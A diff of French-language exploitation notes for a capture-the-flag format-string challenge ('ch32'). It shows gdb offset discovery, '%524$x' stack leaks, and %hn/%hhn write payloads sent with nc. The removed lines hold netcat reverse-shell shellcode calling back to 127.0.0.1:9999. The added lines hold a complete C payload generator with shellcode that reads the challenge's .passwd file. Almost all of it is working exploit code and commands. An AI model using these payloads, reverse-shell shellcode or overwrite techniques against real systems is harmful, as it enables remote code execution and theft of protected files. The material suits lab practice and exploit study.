@@ -1,62 +1,169 @@
-Pas de format pour le snprintf
+#on exploite la faille du snprintf
 
-disas recv_loop
-	[...]
-	 	0x08048876 <+274>:	call   0x804a048 <close@plt>
-		x48
-		 python -c 'print "AAAA%x%x%x%x%x%x%x%x"' | nc localhost 56030
-		 AAAA0010341414141782578257825782578257825
-		 offset du buffer 5 octets
+gdb ch32
+##pour suivre les processus fils du fork
+set follow-fork-mode child
+##break sur le snprintf
+break *0x8048822
+echo "tata" | nc localhost 56006
+x/10xw $esp
+exemple:
+0xffffc660:     0xffffc678      0x00000400      0xffffca78      0x00000000
+0xffffc670:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffc680:     0x00000000      0x00000000
+x/xw $ebp
+exemple:
+0xffffce98:     0xffffcef8
 
-		 b snprintf
-		 	0xb7e77890
-			ret sprintf 0xB7E778C7
-			n0x8048876 <recv_loop+274>:	call  0x804a048 <close@plt>
+##on calcul pour obtenir le veil ebp
+0xffffce98 - 0xffffc66c
+-->  523
 
-			x/4xw $esp
-			0xbffff3dc:	0x08048841	0xbffff7fc	0x00000400	0xbffff3fc
-			output = 0xbffff7fc
-			taille = 0x400
-			input = 0xbffff3fc
+echo '0x%524$x' | nc localhost 56006
+0xffffcef8
 
-			prochain registre = 0xbffff7fc + 0x400 +0x4 = 0xBFFFFC00
 
-			x/4xw $ebp
-			0xbffffc18:	0xbffffc78	0x08048a61	0x00000007	0x00000005
-
-			0xbffff3dc - 0xbffffc18 = 0x83C = 2092
-
-			nbr de registre = 2092 / 4 = 527
-
-			echo '0x%527$x' | nc localhost 56030
-				0x5
-
-				- offset du buffer
-				echo '0x%524$x' | nc localhost 56030
+##on ecrit un programme
+[
 
 
 
-				reverse bind shell code = "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x33\x31\x33\x31\x23\x90"
-				trouvé sur "http://blog.csdn.net/wgwgnihao/article/details/45933359" ("/bin/netcat#-e#/bin/sh#127.000.000.001#9999")
-
-				"\x48\xa0\x04\x08"
-
-				printf "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x33\x31\x33\x31\x23\x90" | nc localhost 56031
-				�<^1�F
-				      �F�F�F&�F+�v,�^
-					                       �^0�^�^4�^�^8�^'�^<�F@�
-										                                               ��N,�V@̀����/bin/netcat#-e#/bin/sh#127.000.000.001#9999#�
 
 
-																					   addresse de close
-																					   0x804a048 = "\x48\xa0\x04\x08"
-
-																					   lecture vers les nop
-																					   "%62291x%5$hn%52203x%6$hn"
 
 
-																					   nc -lvp 9999
-																					   python -c 'print "\x48\xa0\x04\x08" + "\x4a\xa0\x04\x08" + "\x90" * 50 + "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23" + 24 * "\x90" + "%62291x%5$hn%52203x%6$hn"' | nc localhost 56032
 
-																					   cd challenge/app-systeme/ch32 && cat .passwd
 
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+ 
+char shellcode[] = {
+					0x31, 0xc0, 0x50, 0x68, 0x73, 0x73, 0x77, 0x64, 0x68, 0x2f,
+					0x2e, 0x70, 0x61, 0x68, 0x2e, 0x2f, 0x2f, 0x2f, 0x89, 0xe3, 
+					0x89, 0xc1, 0x89, 0xc2, 0xb0, 0x05, 0xcd, 0x80, 0x89, 0xc3,
+					0x8d, 0x8d, 0xe0, 0xf7, 0xff, 0xff, 0x31, 0xd2, 0xb2, 0xff,
+					0x31, 0xc0, 0xb0, 0x03, 0xcd, 0x80, 0x01, 0xc1, 0x31, 0xc0,
+					0x89, 0x41, 0x01, 0x04, 0x10, 0x01, 0xc4, 0x31, 0xc0, 0x89,
+					0x44, 0x24, 0x08, 0xb8, 0x36, 0x88, 0x04, 0x08, 0xff, 0xe0 
+				   };
+ 
+// Ecrit dans output le nombre n 
+void print_uint32_LE(char *output, uint32_t n)
+{
+	int i;
+ 
+	for (i = 0 ; i < sizeof n ; i++)
+	{
+		output[i] = (n >> (8 * i)) & 0xff;
+	}
+}
+ 
+int main(int argc, char *argv[])
+{
+	char output[1024];
+	int i, j;
+	uint32_t base_addr, ret_addr, shellcode_addr;
+	unsigned char shellcode_addr_ordered[4], n = 0;
+	uint32_t ret_addr_ordered[4]; 
+ 
+	if (argc < 2)
+	{
+		printf("Usage : %s <address>\n", argv[0]);
+		printf("<address> can be obtained sending '%%524$x'\n");
+		exit(EXIT_FAILURE);
+	}
+ 
+	base_addr = strtoul(argv[1], NULL, 0);
+	ret_addr = base_addr - 2204;
+	shellcode_addr = base_addr - 402;
+ 
+	for (i = 0 ; i < 4 ; i++)
+	{
+		ret_addr_ordered[i] = ret_addr + i;
+		shellcode_addr_ordered[i] = (shellcode_addr >> (8 * i)) & 0xff;
+	}
+ 
+	// Tri croissant en fonction des octets de l'adresse du shellcode 
+	for (i = 0 ; i < 4 ; i++)
+	{
+		for (j = i + 1 ; j < 4 ; j++)
+		{
+			if (shellcode_addr_ordered[i] > shellcode_addr_ordered[j])
+			{
+				unsigned char tmps = shellcode_addr_ordered[i];
+				uint32_t tmpr = ret_addr_ordered[i];
+				shellcode_addr_ordered[i] = shellcode_addr_ordered[j];
+				shellcode_addr_ordered[j] = tmps;
+				ret_addr_ordered[i] = ret_addr_ordered[j];
+				ret_addr_ordered[j] = tmpr;
+			}
+		}
+	}
+ 
+	for (i = 0 ; i < 1024 ; i++)
+	{
+		output[i] = '\0';
+	}
+ 
+ 
+	// n contient le nombre de caractères affichés en sortie dans la chaine output du serveur
+	for (i = 0 ; i < 4 ; i++)
+	{
+		print_uint32_LE(output + i * 4, ret_addr_ordered[i]);
+		n += 4;
+	}
+ 
+	strcat(output, "%x%x%x");
+	n += 3;
+ 
+	// Rotation si necessaire, la valeur de n est modulo 256 et on a deja ecrit un certain nombre de caractères
+	for (i = 0 ; i < 4 ; i++)
+	{
+		if (shellcode_addr_ordered[0] < n)
+		{
+			unsigned char tmp = shellcode_addr_ordered[0];
+			for (j = 0 ; j < 3 ; j++)
+			{
+				shellcode_addr_ordered[j] = shellcode_addr_ordered[j+1];
+			}
+			shellcode_addr_ordered[3] = tmp;
+		}
+	}
+ 
+	// espaces puis  %hhn, pour chaque octet de l'adresse de retour 
+	for (i = 0 ; i < 4 ; i++)
+	{
+		unsigned int size = strlen(output);
+		for (j = 0 ; n != shellcode_addr_ordered[i] ; n++, j++)
+		{
+			output[size + j] = ' ';
+		}
+		strcat(output, "%hhn");
+	}
+ 
+	for (i = strlen(output) ; i < 900 ; i++)
+	{
+		output[i] = 0x90;
+	}
+ 
+	//shellcode
+	for (j = 0 ; j < sizeof(shellcode) ; j++)
+	{
+		output[i + j] = shellcode[j];
+	}
+ 
+	write(1, output, 1024);
+ 
+	return EXIT_SUCCESS;
+}
+
+
+
+
+
+]
+
+cat .passwd
